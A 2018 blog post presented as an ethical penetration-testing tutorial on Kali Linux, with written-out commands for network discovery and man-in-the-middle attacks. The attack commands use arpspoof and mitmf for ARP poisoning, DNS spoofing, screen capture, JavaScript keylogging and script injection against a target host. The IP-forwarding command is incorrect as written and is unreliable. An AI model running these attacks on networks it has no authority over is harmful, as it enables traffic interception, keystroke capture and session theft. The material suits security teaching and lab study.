---
layout: post
title:  "Kali - Penetration Testing"
date:   2018-02-04 14:58:15 -0400
categories: ubuntu linux security pentesting hacking
logo: kali.jpg
---
This post will list a summary of various tools and examples on how to pen-test a network. Note that
this post is ONLY intended for ethical/white-hat hacking and is absolutely not intended to be a
source for malicious intent. The tools and methods used within this post are based on a source system
using the [Kali](https://www.kali.org/) operating system.

### Technology Ecosystem

The steps in this post are executed on a desktop running the Kali operating system (specifically,
Kali Linux version 2017.3, 64-bit). Details related to the host machine are as follows:

**Kali Host**

- **Hostname**: kali.localhost
- **OS**: Kali 2017.3
- **CPU**: 2
- **RAM**: 4096MB
- **Disk 1 (OS)**: 500GB
- **Network**: Private Network
- **IP**: 192.168.1.233

In addition, the Kali instance is connected to a home network with many other various devices
attached. Again, the testing and examples performed in this post are devices owned by the author
and the testing is performed within full legal compliance on the author's own devices.

### Discover Devices on Network

Let's assume you're already connected to a network (home network, for instance). To inspect the
devices that are present on the network you can perform any of the following:

{% highlight bash %}
# Host: kali.localhost
# PREREQUISITE - FIND NETWORK
$ sudo ifconfig
# inspect the IP address of the Kali instance - translate this into the
# network CIDR (i.e. 192.168.1.1/24) and pass along to the commands as
# seen below...

# DISCOVER USING NETDISCOVER
$ sudo netdiscover -i wlan0 -r 192.168.1.1/24
# should output a table of information with corresponding IP addresses,
# MAC addresses, etc.

# DISCOVER USING NMAP
$ sudo nmap -sn 192.168.1.1/24
# scan of responding IPs on network
$ sudo nmap -T4 -F 192.168.1.1/24
# quick scan showing devices and open ports
$ sudo nmap -sV -T4 -O -F 192.168.1.1/24
# enhanced quick scan showing devices, open ports, and supplemental info
{% endhighlight %}

Aside from command-line tools, there are other tools such as
[Autoscan](http://autoscan-network.com/download/) and [Zenmap](https://nmap.org/zenmap/) that
can offer more detailed information as well.

Now that you know the devices connected to the same network your Kali instance is connected to,
you can start to pick targets for penetration testing.

### Man in the Middle

Performing a man in the middle attack places your penetration test instance between the target
and the router, allowing all network traffic to pass through your instance. The following steps
include how to perform a man in the middle attack using ARP spoofing/poisoning and corresponding
abilities for further penetration efforts once you have become the man in the middle.

#### Address Resolution Protocol (ARP) Spoofing

As a means for attempting a man-in-the-middle (MITM) attack, you can use what is known as ARP
spoofing/poisoning. There are several tools that can achieve this which will cause your Kali
instance to sit between the router and the target device, passing all network traffic through
your penetration testing instance.

{% highlight bash %}
# Host: [Target instance]
$ sudo arp -a
# inspects ARP tables - gateway (192.168.1.1) will show a MAC
# re-inspect this once one of the poisoning methods below is
# used on the target instance - it will show the MAC of the
# Kali instance if ARP poisoning was successful

# Host: kali.localhost
# PREREQUISITE - ENABLE IPV4 FORWARDING
$ sudo echo 1 > /etc/sysconfig/ipv4/ip_forward

# POISONING USING ARPSPOOF
$ sudo arpspoof -i wlan0 -t 192.168.1.55 192.168.1.1
# poisons the target 192.168.1.55 using the wlan0 (wireless)
# network interface with the router being IP 192.168.1.1
# can now use something like Wireshark to inspect traffic

# POISONING USING MITMF
# note that mitmf auto-loads SSLStrip (downgrading HTTPS connections)
# automatically, which the user may notice
$ sudo mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.55 -i wlan0
# will output information as the user browses the internet
{% endhighlight %}

#### Session Hijacking

Now that we can become the man in the middle, we can also session hijack, which is useful if
the user utilizes things such as "remember me" features in websites. This functionality saves
the user credential information in cookies/session data within their browser, which can be
sniffed and hijacked/executed using the following tools:

* [hamster-sidejack](https://tools.kali.org/sniffingspoofing/hamster-sidejack)
* [ferret-sidejack](https://pkg.kali.org/pkg/ferret-sidejack)

When used in conjunction with a man-in-the-middle attack, the above tools can be used to
hijack and replicate the stolen session information, allowing the hacker to log into the
suspect's accounts. Examples won't be given here as they are difficult to enumerate via
text and the websites have very good and detailed examples already.

#### DNS Spoofing

DNS spoofing allows for directing a user attempting to access some website to a completely
different target endpoint and can be used in conjunction with a man-in-the-middle attack.

{% highlight bash %}
# Host: kali.localhost
$ sudo mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.55 -i wlan0 --dns
# above command loads the DNS spoofing library
{% endhighlight %}

In conjunction with the Browser Exploitation Framework
[BeEF](https://tools.kali.org/exploitation-tools/beef-xss) you can perform cross-site scripting
attacks in-line with a man-in-the-middle `mitmf` attack using the `--dns` switch. Once you
have set up BeEF, your users can automatically be re-directed to the target IP/location
you have configured rather than the site they were intending to visit.

#### Screen Capture

Upon becoming the man in the middle using the `mitmf` command, you can also configure screen
capture to monitor what the user is viewing using the `--screen` switch for the `mitmf`
command:

{% highlight bash %}
# Host: kali.localhost
$ sudo mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.55 -i wlan0 --screen
# above command takes screen shots of the user activity
{% endhighlight %}

#### Key Logger

Similar to screen capture, you can also use the `mitmf` command to key log the target user
using the `--jskeylogger` switch:

{% highlight bash %}
# Host: kali.localhost
$ sudo mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.55 -i wlan0 --jskeylogger
# above command captures the user key typing activity
{% endhighlight %}

#### Injection

Since traffic passes through your Kali instance prior to being sent from or to the target,
you can inject any kind of data into the network stream prior to it reaching the target
or outbound target using the `mitmf` command with the `--inject` and `--js-payload` switches:

{% highlight bash %}
# Host: kali.localhost
$ sudo mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.55 -i wlan0 --inject --js-payload "alert('test');"
# above command injects javascript inline before response reaches target
# resulting in a dialog being displayed with "test" in the browser
# of the target user
{% endhighlight %}

### Credit

The above tutorial was pieced together with some information from the following sites/resources:

* [Udemy - Learn Ethical Hacking from Scratch by Said Sabih](https://healthedge.udemy.com/learn-ethical-hacking-from-scratch/learn/v4/overview)
